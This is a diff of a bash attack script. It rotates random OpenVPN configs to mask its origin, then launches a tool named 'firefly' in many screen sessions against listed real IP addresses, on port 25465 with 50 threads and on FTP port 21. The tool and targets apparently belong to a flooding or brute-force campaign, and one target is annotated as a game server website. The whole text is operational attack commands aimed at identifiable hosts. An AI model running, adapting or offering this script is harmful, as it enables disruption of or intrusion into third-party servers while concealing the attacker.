@@ -1,14 +1,3 @@
-#!/bin/bash
-#yum install nano unzip screen python-argparse epel-release -y; yum install openvpn -y
-
-files=(/ovpn_tcp/*)
-config="${files[RANDOM % ${#files[@]}]}"
-killall python
-killall python
-killall openvpn
-killall openvpn
-screen -dmS vpn openvpn --config $config
-
 
 #multi
 screen -dmS a python firefly -p 25465 -t 50 107.174.19.150;
@@ -39,7 +28,7 @@ screen -dmS r python firefly -p 25465 -t 50 45.35.54.118;
 #172.106.202.82
 #172.106.202.84
 #172.106.202.117
-
+#172.106.202.119 -mcp fallout website
 #ftp
 screen -dmS s python firefly -p 21 -t 10 107.174.19.150;
 screen -dmS t python firefly -p 21 -t 10 107.174.19.154;
